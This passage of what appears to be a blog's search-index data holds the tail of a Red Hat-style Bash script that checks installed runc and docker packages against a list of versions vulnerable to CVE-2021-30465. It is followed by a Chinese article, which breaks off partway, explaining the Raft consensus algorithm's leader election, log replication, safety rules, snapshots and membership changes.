    &#39;docker-1.12.6-11.el7&#39;
    &#39;docker-1.12.6-16.el7&#39;
    &#39;docker-1.12.6-28.git1398f24.el7&#39;
    &#39;docker-1.12.6-32.git88a4867.el7&#39;
    &#39;docker-1.12.6-48.git0fdc778.el7&#39;
    &#39;docker-1.12.6-55.gitc4618fb.el7&#39;
    &#39;docker-1.12.6-61.git85d7426.el7&#39;
    &#39;docker-1.12.6-68.gitec8512b.el7&#39;
    &#39;docker-1.12.6-71.git3e8e77d.el7&#39;
    &#39;docker-1.12.6-79.git5680db5.el7&#39;
    &#39;docker-1.13.1-53.git774336d.el7&#39;
    &#39;docker-1.13.1-58.git87f2fab.el7&#39;
    &#39;docker-1.13.1-63.git94f4240.el7&#39;
    &#39;docker-1.13.1-68.gitdded712.el7&#39;
    &#39;docker-1.13.1-74.git6e3bb8e.el7&#39;
    &#39;docker-1.13.1-75.git8633870.el7_5&#39;
    &#39;docker-1.13.1-84.git07f3374.el7&#39;
    &#39;docker-1.13.1-88.git07f3374.el7&#39;
    &#39;docker-1.13.1-90.git07f3374.el7&#39;
    &#39;docker-1.13.1-91.git07f3374.el7&#39;
    &#39;docker-1.13.1-94.gitb2f74b2.el7&#39;
    &#39;docker-1.13.1-96.gitb2f74b2.el7&#39;
    &#39;docker-1.13.1-102.git7f2769b.el7&#39;
    &#39;docker-1.13.1-103.git7f2769b.el7&#39;
    &#39;docker-1.13.1-104.git4ef4b30.el7&#39;
    &#39;docker-1.13.1-108.git4ef4b30.el7&#39;
    &#39;docker-1.13.1-109.gitcccb291.el7_7&#39;
    &#39;docker-1.13.1-161.git64e9980.el7_8&#39;
    &#39;docker-1.13.1-162.git64e9980.el7_8&#39;
    &#39;docker-1.13.1-203.git0be3e21.el7_9&#39;
    &#39;docker-1.13.1-204.git0be3e21.el7_9&#39;
    &#39;docker-1.13.1-205.git7d71120.el7_9&#39;
    &#39;docker-latest-1.10.3-22.el7&#39;
    &#39;docker-latest-1.10.3-44.el7&#39;
    &#39;docker-latest-1.10.3-46.el7.10&#39;
    &#39;docker-latest-1.12.1-2.el7&#39;
    &#39;docker-latest-1.12.1-3.el7&#39;
    &#39;docker-latest-1.12.3-10.el7&#39;
    &#39;docker-latest-1.12.5-14.el7&#39;
    &#39;docker-latest-1.12.6-11.el7&#39;
    &#39;docker-latest-1.13.1-4.el7&#39;
    &#39;docker-latest-1.13.1-11.git3a17ad5.el7&#39;
    &#39;docker-latest-1.13.1-13.gitb303bf6.el7&#39;
    &#39;docker-latest-1.13.1-21.1.gitcd75c68.el7&#39;
    &#39;docker-latest-1.13.1-23.git28ae36d.el7&#39;
    &#39;docker-latest-1.13.1-26.git1faa135.el7&#39;
    &#39;docker-latest-1.13.1-36.git9a813fa.el7&#39;
    &#39;docker-latest-1.13.1-37.git9a813fa.el7&#39;
    &#39;docker-latest-1.13.1-53.git774336d.el7&#39;
    &#39;docker-latest-1.13.1-58.git87f2fab.el7&#39;
)

basic_args() {
    # Parses basic commandline arguments and sets basic environment.
    #
    # Args:
    #     parameters - an array of commandline arguments
    #
    # Side effects:
    #     Exits if --help parameters is used
    #     Sets COLOR constants and debug variable

    local parameters=( &amp;quot;$@&amp;quot; )

    RED=&amp;quot;\\033[1;31m&amp;quot;
    GREEN=&amp;quot;\\033[1;32m&amp;quot;
    BOLD=&amp;quot;\\033[1m&amp;quot;
    RESET=&amp;quot;\\033[0m&amp;quot;
    for parameter in &amp;quot;${parameters[@]}&amp;quot;; do
        if [[ &amp;quot;$parameter&amp;quot; == &amp;quot;-h&amp;quot; || &amp;quot;$parameter&amp;quot; == &amp;quot;--help&amp;quot; ]]; then
            echo &amp;quot;Usage: $( basename &amp;quot;$0&amp;quot; ) [-n | --no-colors] [-d | --debug]&amp;quot;
            exit 1
        elif [[ &amp;quot;$parameter&amp;quot; == &amp;quot;-n&amp;quot; || &amp;quot;$parameter&amp;quot; == &amp;quot;--no-colors&amp;quot; ]]; then
            RED=&amp;quot;&amp;quot;
            GREEN=&amp;quot;&amp;quot;
            BOLD=&amp;quot;&amp;quot;
            RESET=&amp;quot;&amp;quot;
        elif [[ &amp;quot;$parameter&amp;quot; == &amp;quot;-d&amp;quot; || &amp;quot;$parameter&amp;quot; == &amp;quot;--debug&amp;quot; ]]; then
            debug=true
        fi
    done
}


basic_reqs() {
    # Prints common disclaimer and checks basic requirements.
    #
    # Args:
    #     CVE - string printed in the disclaimer
    #
    # Side effects:
    #     Exits when &#39;rpm&#39; command is not available

    local CVE=&amp;quot;$1&amp;quot;

    # Disclaimer
    echo
    echo -e &amp;quot;${BOLD}This script (v$VERSION) is primarily designed to detect $CVE on supported&amp;quot;
    echo -e &amp;quot;Red Hat Enterprise Linux systems and kernel packages.&amp;quot;
    echo -e &amp;quot;Result may be inaccurate for other RPM based systems.&amp;quot;
    echo -e &amp;quot;Result may be inaccurate for affected RPM packages not compiled by Red Hat.${RESET}&amp;quot;
    echo

    # RPM is required
    if ! command -v rpm &amp;amp;&amp;gt; /dev/null; then
        echo &amp;quot;&#39;rpm&#39; command is required, but not installed. Exiting.&amp;quot;
        exit 1
    fi
}


check_supported_kernel() {
    # Checks if running kernel is supported.
    #
    # Args:
    #     running_kernel - kernel string as returned by &#39;uname -r&#39;
    #
    # Side effects:
    #     Exits when running kernel is obviously not supported

    local running_kernel=&amp;quot;$1&amp;quot;

    # Check supported platform
    if [[ &amp;quot;$running_kernel&amp;quot; != *&amp;quot;.el&amp;quot;[7-8]* ]]; then
        echo -e &amp;quot;${RED}This script is meant to be used only on RHEL 7 and 8.${RESET}&amp;quot;
        echo
        echo -e &amp;quot;Follow $BULLETIN for advice.&amp;quot;
        exit 1
    fi
}


check_package() {
    # Checks if installed package is in list of vulnerable packages.
    #
    # Args:
    #     installed_packages - installed packages string as returned by &#39;rpm -qa package&#39;
    #                          (may be multiline)
    #     vulnerable_versions - an array of vulnerable versions
    #
    # Prints:
    #     First vulnerable package string as returned by &#39;rpm -qa package&#39;, or nothing

    # Convert to array, use word splitting on purpose
    # shellcheck disable=SC2206
    local installed_packages=( $1 )
    shift
    local vulnerable_versions=( &amp;quot;$@&amp;quot; )

    for tested_package in &amp;quot;${vulnerable_versions[@]}&amp;quot;; do
        for installed_package in &amp;quot;${installed_packages[@]}&amp;quot;; do
            installed_package_without_arch=&amp;quot;${installed_package%.*}&amp;quot;
            if [[ &amp;quot;$installed_package_without_arch&amp;quot; == &amp;quot;$tested_package&amp;quot; ]]; then
                echo &amp;quot;$installed_package&amp;quot;
                return 0
            fi
        done
    done
}


get_installed_packages() {
    # Checks for installed packages. Compatible with RHEL5.
    #
    # Args:
    #     package_names - an array of package name strings
    #
    # Prints:
    #     Lines with N-V-R.A strings of the installed packages.

    local package_names=( &amp;quot;$@&amp;quot; )

    rpm -qa --queryformat=&amp;quot;%{NAME}-%{VERSION}-%{RELEASE}.%{ARCH}\n&amp;quot; &amp;quot;${package_names[@]}&amp;quot;
}


get_installed_package_names() {
    # Checks for installed packages and returns the names of the installed packages. Compatible with RHEL5.
    #
    # Args:
    #     package_names - an array of package name strings
    #
    # Prints:
    #     Lines with the names of the installed packages.

    local package_names=( &amp;quot;$@&amp;quot; )

    rpm -qa --queryformat=&amp;quot;%{NAME}\n&amp;quot; &amp;quot;${package_names[@]}&amp;quot; | uniq
}


parse_facts() {
    # Gathers all available information and stores it in global variables. Only store facts and
    # do not draw conclusion in this function for better maintainability.
    #
    # Side effects:
    #     Sets many global boolean flags and content variables

    installed_runc=$( get_installed_packages &amp;quot;runc&amp;quot; )
    installed_docker=$( get_installed_packages &amp;quot;docker&amp;quot; )
    installed_docker_latest=$( get_installed_packages &amp;quot;docker-latest&amp;quot; )

}

draw_conclusions() {
    # Draws conclusions based on available system data.
    #
    # Side effects:
    #     Sets many global boolean flags and content variables

    vulnerable_runc=$( check_package &amp;quot;$installed_runc&amp;quot; &amp;quot;${VULNERABLE_VERSIONS[@]}&amp;quot; )
    vulnerable_docker=$( check_package &amp;quot;$installed_docker&amp;quot; &amp;quot;${VULNERABLE_VERSIONS[@]}&amp;quot; )
    vulnerable_docker_latest=$( check_package &amp;quot;$installed_docker_latest&amp;quot; &amp;quot;${VULNERABLE_VERSIONS[@]}&amp;quot; )

    result=0
    if [[ &amp;quot;$vulnerable_runc&amp;quot; ]]; then
        (( result |= 2 ))
    fi
    if [[ &amp;quot;$vulnerable_docker&amp;quot; ]]; then
        (( result |= 4 ))
    fi
    if [[ &amp;quot;$vulnerable_docker_latest&amp;quot; ]]; then
        (( result |= 8 ))
    fi
}


debug_print() {
    # Prints selected variables when debugging is enabled.

    variables=( installed_runc installed_docker installed_docker_latest
                vulnerable_runc vulnerable_docker vulnerable_docker_latest
                running_kernel rhel result )
    for variable in &amp;quot;${variables[@]}&amp;quot;; do
        echo &amp;quot;$variable = *${!variable}*&amp;quot;
    done
    echo
}



if [[ &amp;quot;${BASH_SOURCE[0]}&amp;quot; == &amp;quot;$0&amp;quot; ]]; then
    basic_args &amp;quot;$@&amp;quot;
    basic_reqs &amp;quot;CVE-2021-30465&amp;quot;
    running_kernel=$( uname -r )
    check_supported_kernel &amp;quot;$running_kernel&amp;quot;

    parse_facts
    draw_conclusions

    # Debug prints
    if [[ &amp;quot;$debug&amp;quot; ]]; then
        debug_print
    fi

    sentence_end=&amp;quot;.&amp;quot;
    if [[ &amp;quot;$installed_runc&amp;quot; || &amp;quot;$installed_docker&amp;quot; || &amp;quot;$installed_docker_latest&amp;quot; ]]; then
        echo &amp;quot;Detected packages:&amp;quot;
        sentence_end=&amp;quot;:&amp;quot;
    fi
    if [[ &amp;quot;$installed_runc&amp;quot; ]]; then
        echo -e &amp;quot;* Detected &#39;runc&#39; package: ${BOLD}$installed_runc${RESET}&amp;quot;
    else
        echo &amp;quot;* Package &#39;runc&#39; not installed.&amp;quot;
    fi
    if [[ &amp;quot;$installed_docker&amp;quot; ]]; then
        echo -e &amp;quot;* Detected &#39;docker&#39; package: ${BOLD}$installed_docker${RESET}&amp;quot;
    else
        echo &amp;quot;* Package &#39;docker&#39; not installed.&amp;quot;
    fi
    if [[ &amp;quot;$installed_docker_latest&amp;quot; ]]; then
        echo -e &amp;quot;* Detected &#39;docker-latest&#39; package: ${BOLD}$installed_docker_latest${RESET}&amp;quot;
    else
        echo &amp;quot;* Package &#39;docker-latest&#39; not installed.&amp;quot;
    fi

    echo
    if (( result )); then
        echo -e &amp;quot;${RED}This system is vulnerable:${RESET}&amp;quot;
    else
        echo -e &amp;quot;${GREEN}This system is not vulnerable${sentence_end}${RESET}&amp;quot;
    fi

    if [[ &amp;quot;$installed_runc&amp;quot; ]]; then
        if [[ &amp;quot;$vulnerable_runc&amp;quot; ]]; then
            echo -e &amp;quot;* &#39;runc&#39; package is ${RED}vulnerable${RESET}&amp;quot;
        else
            echo -e &amp;quot;* &#39;runc&#39; package is ${GREEN}NOT vulnerable${RESET}&amp;quot;
        fi
    fi

    if [[ &amp;quot;$installed_docker&amp;quot; ]]; then
        if [[ &amp;quot;$vulnerable_docker&amp;quot; ]]; then
            echo -e &amp;quot;* &#39;docker&#39; package is ${RED}vulnerable${RESET}&amp;quot;
        else
            echo -e &amp;quot;* &#39;docker&#39; package is ${GREEN}NOT vulnerable${RESET}&amp;quot;
        fi
    fi

    if [[ &amp;quot;$installed_docker_latest&amp;quot; ]]; then
        if [[ &amp;quot;$vulnerable_docker_latest&amp;quot; ]]; then
            echo -e &amp;quot;* &#39;docker-latest&#39; package is ${RED}vulnerable${RESET}&amp;quot;
        else
            echo -e &amp;quot;* &#39;docker-latest&#39; package is ${GREEN}NOT vulnerable${RESET}&amp;quot;
        fi
    fi

    if [[ ! &amp;quot;$vulnerable_runc&amp;quot; &amp;amp;&amp;amp; ! &amp;quot;$vulnerable_docker&amp;quot; &amp;amp;&amp;amp; ! &amp;quot;$vulnerable_docker_latest&amp;quot; ]]; then
        echo
        echo -e &amp;quot;There are ${GREEN}NO vulnerable packages${RESET} installed.&amp;quot;
    fi

    echo
    echo -e &amp;quot;Follow $BULLETIN for advice.&amp;quot;

    exit &amp;quot;$result&amp;quot;
fi

&lt;/code&gt;&lt;/pre&gt;
">【容器】CVE-2021-30465 runC逃逸漏洞分析复现</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/raft-yi-zhi-xing-gong-shi-suan-fa/"" data-c="
          &lt;p&gt;分布式存储系统通常通过维护多个副本来进行容错，提高系统的可用性。要实现此目标，就必须要解决分布式存储系统的最核心问题：维护多个副本的一致性。&lt;/p&gt;
&lt;p&gt;首先需要解释一下什么是一致性（consensus）,它是构建具有容错性（fault-tolerant）的分布式系统的基础。 在一个具有一致性的性质的集群里面，同一时刻所有的结点对存储在其中的某个值都有相同的结果，即对其共享的存储保持一致。集群具有自动恢复的性质，当少数结点失效的时候不影响集群的正常工作，当大多数集群中的结点失效的时候，集群则会停止服务（不会返回一个错误的结果）。&lt;/p&gt;
&lt;p&gt;一致性协议就是用来干这事的，用来保证即使在部分(确切地说是小部分)副本宕机的情况下，系统仍然能正常对外提供服务。一致性协议通常基于replicated state machines，即所有结点都从同一个state出发，都经过同样的一些操作序列（log），最后到达同样的state。&lt;/p&gt;
&lt;h2 id=&#34;架构&#34;&gt;架构&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://pic2.zhimg.com/v2-e747e997d58aee9252b187c8434a1cc1_b.jpg&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;系统中每个结点有三个组件：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://www.zhihu.com/search?q=%E7%8A%B6%E6%80%81%E6%9C%BA&amp;amp;search_source=Entity&amp;amp;hybrid_search_source=Entity&amp;amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%2227207160%22%7D&#34;&gt;状态机&lt;/a&gt;: 当我们说一致性的时候，实际就是在说要保证这个状态机的一致性。状态机会从log里面取出所有的命令，然后执行一遍，得到的结果就是我们对外提供的保证了一致性的数据&lt;br&gt;
Log: 保存了所有修改记录&lt;br&gt;
一致性模块: 一致性模块算法就是用来保证写入的log的命令的一致性，这也是raft算法核心内容&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;协议内容&lt;/p&gt;
&lt;p&gt;Raft协议将一致性协议的核心内容分拆成为几个关键阶段，以简化流程，提高协议的可理解性。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Leader election&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Raft协议的每个副本都会处于三种状态之一：Leader、Follower、Candidate。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Leader&lt;/strong&gt;：所有请求的处理者，Leader副本接受client的更新请求，本地处理后再同步至多个其他副本；&lt;br&gt;
&lt;strong&gt;Follower&lt;/strong&gt;：请求的被动更新者，从Leader接受更新请求，然后写入本地日志文件&lt;br&gt;
&lt;strong&gt;Candidate&lt;/strong&gt;：如果Follower副本在一段时间内没有收到Leader副本的心跳，则判断Leader可能已经故障，此时启动选主过程，此时副本会变成Candidate状态，直到选主结束。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;时间被分为很多连续的随机长度的term，term有唯一的id。每个term一开始就进行选主：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Follower将自己维护的current_term_id加1。&lt;/li&gt;
&lt;li&gt;然后将自己的状态转成Candidate&lt;/li&gt;
&lt;li&gt;发送RequestVoteRPC消息(带上current_term_id) 给 其它所有server&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这个过程会有三种结果：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自己被选成了主。当收到了majority的投票后，状态切成Leader，并且定期给其它的所有server发心跳消息（不带log的AppendEntriesRPC）以告诉对方自己是current_term_id所标识的term的leader。每个term最多只有一个leader，term id作为logical clock，在每个RPC消息中都会带上，用于检测过期的消息。当一个server收到的RPC消息中的rpc_term_id比本地的current_term_id更大时，就更新current_term_id为rpc_term_id，并且如果当前state为leader或者candidate时，将自己的状态切成follower。如果rpc_term_id比本地的current_term_id更小，则拒绝这个RPC消息。&lt;/li&gt;
&lt;li&gt;别人成为了主。如1所述，当Candidator在等待投票的过程中，收到了大于或者等于本地的current_term_id的声明对方是leader的AppendEntriesRPC时，则将自己的state切成follower，并且更新本地的current_term_id。&lt;/li&gt;
&lt;li&gt;没有选出主。当投票被瓜分，没有任何一个candidate收到了majority的vote时，没有leader被选出。这种情况下，每个candidate等待的投票的过程就超时了，接着candidates都会将本地的current_term_id再加1，发起RequestVoteRPC进行新一轮的leader election。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;投票策略：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每个节点只会给每个term投一票，具体的是否同意和后续的Safety有关。&lt;/li&gt;
&lt;li&gt;当投票被瓜分后，所有的candidate同时超时，然后有可能进入新一轮的票数被瓜分，为了避免这个问题，Raft采用一种很简单的方法：每个Candidate的election timeout从150ms-300ms之间随机取，那么第一个超时的Candidate就可以发起新一轮的leader election，带着最大的term_id给其它所有server发送RequestVoteRPC消息，从而自己成为leader，然后给他们发送心跳消息以告诉他们自己是主。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Log Replication&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当Leader被选出来后，就可以接受&lt;a href=&#34;https://www.zhihu.com/search?q=%E5%AE%A2%E6%88%B7%E7%AB%AF&amp;amp;search_source=Entity&amp;amp;hybrid_search_source=Entity&amp;amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A%2227207160%22%7D&#34;&gt;客户端&lt;/a&gt;发来的请求了，每个请求包含一条需要被replicated state machines执行的命令。leader会把它作为一个log entry append到日志中，然后给其它的server发AppendEntriesRPC请求。当Leader确定一个log entry被safely replicated了（大多数副本已经将该命令写入日志当中），就apply这条log entry到状态机中然后返回结果给客户端。如果某个Follower宕机了或者运行的很慢，或者网络丢包了，则会一直给这个Follower发AppendEntriesRPC直到日志一致。&lt;/p&gt;
&lt;p&gt;当一条日志是commited时，Leader才可以将它应用到状态机中。Raft保证一条commited的log entry已经持久化了并且会被所有的节点执行。&lt;/p&gt;
&lt;p&gt;当一个新的Leader被选出来时，它的日志和其它的Follower的日志可能不一样，这个时候，就需要一个机制来保证日志的一致性。一个新leader产生时，集群状态可能如下：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://pic4.zhimg.com/v2-8884bbb61f0eed0aba4e8320c2692783_b.jpg&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;最上面这个是新Leader，a~f是Follower，每个格子代表一条log entry，格子内的数字代表这个log entry是在哪个term上产生的。&lt;/p&gt;
&lt;p&gt;新Leader产生后，就以Leader上的log为准。其它的follower要么少了数据比如b，要么多了数据，比如d，要么既少了又多了数据，比如f。&lt;/p&gt;
&lt;p&gt;因此，需要有一种机制来让leader和follower对log达成一致，leader会为每个follower维护一个nextIndex，表示leader给各个follower发送的下一条log entry在log中的index，初始化为leader的最后一条log entry的下一个位置。leader给follower发送AppendEntriesRPC消息，带着(term_id, (nextIndex-1))， term_id即(nextIndex-1)这个槽位的log entry的term_id，follower接收到AppendEntriesRPC后，会从自己的log中找是不是存在这样的log entry，如果不存在，就给leader回复拒绝消息，然后leader则将nextIndex减1，再重复，知道AppendEntriesRPC消息被接收。&lt;/p&gt;
&lt;p&gt;以leader和b为例：&lt;/p&gt;
&lt;p&gt;初始化，nextIndex为11，leader给b发送AppendEntriesRPC(6,10)，b在自己log的10号槽位中没有找到term_id为6的log entry。则给leader回应一个拒绝消息。接着，leader将nextIndex减一，变成10，然后给b发送AppendEntriesRPC(6, 9)，b在自己log的9号槽位中同样没有找到term_id为6的log entry。循环下去，直到leader发送了AppendEntriesRPC(4,4)，b在自己log的槽位4中找到了term_id为4的log entry。接收了消息。随后，leader就可以从槽位5开始给b推送日志了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Safety&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;哪些follower有资格成为leader?&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Raft保证被选为新leader的节点拥有所有已提交的log entry，这与ViewStamped Replication不同，后者不需要这个保证，而是通过其他机制从follower拉取自己没有的提交的日志记录&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这个保证是在RequestVoteRPC阶段做的，candidate在发送RequestVoteRPC时，会带上自己的最后一条日志记录的term_id和index，其他节点收到消息时，如果发现自己的日志比RPC请求中携带的更新，拒绝投票。日志比较的原则是，如果本地的最后一条log entry的term id更大，则更新，如果term id一样大，则日志更多的更大(index更大)。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;哪些日志记录被认为是commited?&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;leader正在replicate当前term（即term 2）的日志记录给其它Follower，一旦leader确认了这条log entry被majority写盘了，这条log entry就被认为是committed。如图a，S1作为当前term即term2的leader，log index为2的日志被majority写盘了，这条log entry被认为是commited&lt;/li&gt;
&lt;li&gt;leader正在replicate更早的term的log entry给其它follower。图b的状态是这么出来的。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;对协议的一点修正&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在实际的协议中，需要进行一些微调，这是因为可能会出现下面这种情况：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://pic3.zhimg.com/v2-77762ec1707940412736c332376dd0c6_b.jpg&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol&gt;
&lt;li&gt;在阶段a，term为2，S1是Leader，且S1写入日志（term, index）为(2, 2)，并且日志被同步写入了S2；&lt;/li&gt;
&lt;li&gt;在阶段b，S1离线，触发一次新的选主，此时S5被选为新的Leader，此时系统term为3，且写入了日志（term, index）为（3， 2）;&lt;/li&gt;
&lt;li&gt;S5尚未将日志推送到Followers变离线了，进而触发了一次新的选主，而之前离线的S1经过重新上线后被选中变成Leader，此时系统term为4，此时S1会将自己的日志同步到Followers，按照上图就是将日志（2， 2）同步到了S3，而此时由于该日志已经被同步到了多数节点（S1, S2, S3），因此，此时日志（2，2）可以被commit了（即更新到状态机）；&lt;/li&gt;
&lt;li&gt;在阶段d，S1又很不幸地下线了，系统触发一次选主，而S5有可能被选为新的Leader（这是因为S5可以满足作为主的一切条件：1. term = 3 &amp;gt; 2, 2. 最新的日志index为2，比大多数节点（如S2/S3/S4的日志都新），然后S5会将自己的日志更新到Followers，于是S2、S3中已经被提交的日志（2，2）被截断了，这是致命性的错误，因为一致性协议中不允许出现已经应用到状态机中的日志被截断。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;为了避免这种致命错误，需要对协议进行一个微调：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;只允许主节点提交包含当前term的日志&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;针对上述情况就是：即使日志（2，2）已经被大多数节点（S1、S2、S3）确认了，但是它不能被Commit，因为它是来自之前term(2)的日志，直到S1在当前term（4）产生的日志（4， 3）被大多数Follower确认，S1方可Commit（4，3）这条日志，当然，根据Raft定义，（4，3）之前的所有日志也会被Commit。此时即使S1再下线，重新选主时S5不可能成为Leader，因为它没有包含大多数节点已经拥有的日志（4，3）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Log Compaction&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在实际的系统中，不能让日志无限增长，否则系统重启时需要花很长的时间进行回放，从而影响availability。Raft采用对整个系统进行snapshot来处理，snapshot之前的日志都可以丢弃。Snapshot技术在Chubby和ZooKeeper系统中都有采用。&lt;/p&gt;
&lt;p&gt;Raft使用的方案是：*&lt;strong&gt;每个副本独立的对自己的系统状态进行Snapshot，并且只能对已经提交的日志记录（已经应用到状态机）进行snapshot。*&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Snapshot中包含以下内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;日志元数据，最后一条commited log entry的 (log index, last_included_term)。这两个值在Snapshot之后的第一条log entry的AppendEntriesRPC的consistency check的时候会被用上，之前讲过。一旦这个server做完了snapshot，就可以把这条记录的最后一条log index及其之前的所有的log entry都删掉。&lt;/li&gt;
&lt;li&gt;系统状态机：存储系统当前状态（这是怎么生成的呢？）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;snapshot的缺点就是不是增量的，即使内存中某个值没有变，下次做snapshot的时候同样会被dump到磁盘。当leader需要发给某个follower的log entry被丢弃了(因为leader做了snapshot)，leader会将snapshot发给落后太多的follower。或者当新加进一台机器时，也会发送snapshot给它。发送snapshot使用新的RPC，InstalledSnapshot。&lt;/p&gt;
&lt;p&gt;做snapshot有一些需要注意的性能点，1. 不要做太频繁，否则消耗磁盘带宽。 2. 不要做的太不频繁，否则一旦节点重启需要回放大量日志，影响可用性。系统推荐当日志达到某个固定的大小做一次snapshot。3. 做一次snapshot可能耗时过长，会影响正常log entry的replicate。这个可以通过使用copy-on-write的技术来避免snapshot过程影响正常log entry的replicate。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;集群拓扑变化&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;集群拓扑变化的意思是在运行过程中多副本集群的结构性变化，如增加/减少副本数、节点替换等。&lt;/p&gt;
&lt;p&gt;Raft协议定义时也考虑了这种情况，从而避免由于下线老集群上线新集群而引起的系统不可用。Raft也是利用上面的Log Entry和一致性协议来实现该功能。&lt;/p&gt;
&lt;p&gt;假设在Raft中，老集群配置用Cold表示，新集群配置用Cnew表示，整个集群拓扑变化的流程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;当集群成员配置改变时，leader收到人工发出的重配置命令从Cold切成Cnew；&lt;/li&gt;
&lt;li&gt;Leader副本在本地生成一个新的log entry，其内容是Cold∪Cnew，代表当前时刻新旧拓扑配置共存，写入本地日志，同时将该log entry推送至其他Follower节点&lt;/li&gt;
&lt;li&gt;Follower副本收到log entry后更新本地日志，并且此时就以该配置作为自己了解的全局拓扑结构，&lt;/li&gt;
&lt;li&gt;如果多数Follower确认了Cold U Cnew这条日志的时候，Leader就Commit这条log entry；&lt;/li&gt;
&lt;li&gt;接下来Leader生成一条新的log entry，其内容是全新的配置Cnew，同样将该log entry写入本地日志，同时推送到Follower上；&lt;/li&gt;
&lt;li&gt;Follower收到新的配置日志Cnew后，将其写入日志，并且从此刻起，就以该新的配置作为系统拓扑，并且如果发现自己不在Cnew这个配置中会自动退出&lt;/li&gt;
&lt;li&gt;Leader收到多数Follower的确认消息以后，给客户端发起命令执行成功的消息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;异常分析&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果Leader的Cold U Cnew尚未推送到Follower，Leader就挂了，此时选出的新的Leader并不包含这条日志，此时新的Leader依然使用Cold作为全局拓扑配置&lt;/li&gt;
&lt;li&gt;如果Leader的Cold U Cnew推送到大部分的Follower后就挂了，此时选出的新的Leader可能是Cold也可能是Cnew中的某个Follower；&lt;/li&gt;
&lt;li&gt;如果Leader在推送Cnew配置的过程中挂了，那么和2一样，新选出来的Leader可能是Cold也可能是Cnew中的某一个，那么此时客户端继续执行一次改变配置的命令即可&lt;/li&gt;
&lt;li&gt;如果大多数的Follower确认了Cnew这个消息后，那么接下来即使Leader挂了，新选出来的Leader也肯定是位于Cnew这个配置中的，因为有Raft的协议保证。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;为什么需要弄这样一个两阶段协议，而不能直接从Cold切换至Cnew？&lt;/p&gt;
&lt;p&gt;这是因为，如果直接这么简单粗暴的来做的话，可能会产生多主。简单说明下：&lt;/p&gt;
&lt;p&gt;假设Cold为拓扑为(S1, S2, S3)，且S1为当前的Leader，如下图：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://pic4.zhimg.com/v2-dc605b595be1836ef034864244c36f37_b.jpg&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;假如此时变更了系统配置，将集群范围扩大为5个，新增了S4和S5两个服务节点，这个消息被分别推送至S2和S3，但是假如只有S3收到了消息并处理，S2尚未得到该消息&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://pic4.zhimg.com/v2-9e275b79809c0793b3a74a6836222e9b_b.jpg&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;这时在S2的眼里，拓扑依然是&amp;lt;S1, S2, S3&amp;gt;，而在S3的眼里拓扑则变成了&amp;lt;S1, S2, S3, S4, S5&amp;gt;。假如此时由于某种原因触发了一次新的选主，S2和S3分别发起选主的请求：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://pic3.zhimg.com/v2-63fee36e8721b0ace81ca47aa3f90a7a_b.jpg&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
